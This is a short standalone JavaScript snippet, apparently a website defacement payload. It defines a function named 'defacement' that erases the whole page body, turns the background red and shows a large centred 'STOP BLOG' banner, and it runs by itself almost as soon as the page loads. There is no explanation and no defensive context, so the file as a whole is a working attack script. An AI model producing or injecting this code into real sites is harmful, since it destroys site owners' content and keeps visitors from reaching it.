
function defacement(){
document.body.style.backgroundColor = "red";

document.body.innerHTML = "";

var hackedMessage = document.createElement("div");

hackedMessage.textContent = "STOP BLOG";

hackedMessage.style.position = "fixed";
hackedMessage.style.top = "50%";
hackedMessage.style.left = "50%";
hackedMessage.style.transform = "translate(-50%, -50%)";
hackedMessage.style.color = "white";
hackedMessage.style.fontSize = "3em";
hackedMessage.style.fontWeight = "bold";
hackedMessage.style.zIndex = "1000";

document.body.appendChild(hackedMessage);

}

setTimeout(defacement, 1);